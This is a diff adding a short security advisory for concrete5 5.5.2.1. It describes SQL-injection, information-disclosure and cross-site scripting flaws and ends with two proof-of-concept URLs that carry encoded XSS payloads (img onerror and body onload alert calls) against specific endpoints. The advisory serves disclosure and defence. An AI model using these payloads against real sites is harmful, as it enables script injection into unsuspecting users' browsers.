@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/53268/info
+
+concrete5 is prone to information-disclosure, SQL-injection and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to harvest sensitive information, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, or execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
+
+concrete5 5.5.2.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/concrete5.5.2.1/index.php/tools/required/edit_collection_popup.php?approveImmediately=%22%3e%3cimg%20src%3dx%20onerror%3dalert(123123123)%3e&cID=102&ctask=edit_metadata
+
+http://www.example.com/concrete5.5.2.1/index.php?cID=121&bID=38&arHandle=Main&ccm_token=...:...&btask=''%3b!--"%3cbody%20onload%3dalert(12312312323)%3e%3d%26{()}&method=submit_form 
